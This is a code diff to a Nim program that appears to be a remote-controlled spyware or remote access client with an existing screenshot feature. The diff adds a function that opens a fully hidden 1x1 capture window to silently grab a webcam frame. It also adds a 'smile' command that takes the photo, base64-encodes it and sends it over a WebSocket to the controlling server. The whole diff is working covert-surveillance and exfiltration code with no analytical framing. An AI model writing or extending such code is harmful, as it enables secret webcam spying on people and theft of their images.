@@ -151,6 +151,31 @@ proc takeScreenshot(filename: string) =
   DeleteDC(hdcMem)
   ReleaseDC(0, hdcScreen)
 
+proc captureImage(outputFile: string) =
+  const WM_CAP_DRIVER_CONNECT = 0x0400 + 10
+  const WM_CAP_DRIVER_DISCONNECT = 0x0400 + 11
+  const WM_CAP_SAVEDIB = 0x0400 + 25
+  const WM_CAP_GRAB_FRAME = 0x0400 + 60
+  const WM_CAP_EDIT_COPY = 0x0400 + 30
+  let capWnd = capCreateCaptureWindowA("", WS_POPUP, 0, 0, 1, 1, 0, 0)  # Fully hidden window
+  if capWnd == 0:
+    echo "Failed to create capture window"
+    return
+
+  if SendMessageA(capWnd, WM_CAP_DRIVER_CONNECT, 0, 0) == 0:
+    echo "Failed to connect to camera"
+    return
+
+  SendMessageA(capWnd, WM_CAP_GRAB_FRAME, 0, 0)  # Capture the frame
+  let result = SendMessageA(capWnd, WM_CAP_SAVEDIB, 0, cast[LPARAM](outputFile.cstring))  # Convert to cstring first!
+
+  SendMessageA(capWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)  # Disconnect camera
+
+  if result == 0:
+    echo "Failed to save image"
+  else:
+    echo "Image saved successfully to: ", outputFile
+
 
 proc main() {.async.} =
   var ws: WebSocket
@@ -294,6 +319,21 @@ proc main() {.async.} =
         }
         await ws.send($responseJson)
         echo "Sent response: ", $responseJson
+
+      elif command.startsWith("smile"):
+        echo "smile"
+        let screenshotPath = "cam.bmp"
+        captureImage(screenshotPath)
+        let imageData = readFile(screenshotPath)
+        let enc = encode(imageData)
+        let responseJson = %* {
+              "type": "exec",
+              "client_id": client,
+              "state": "error",
+              "command": command,
+              "data": enc
+        }
+        await ws.send($responseJson)
 
   ws.close()
   echo "WebSocket connection closed."
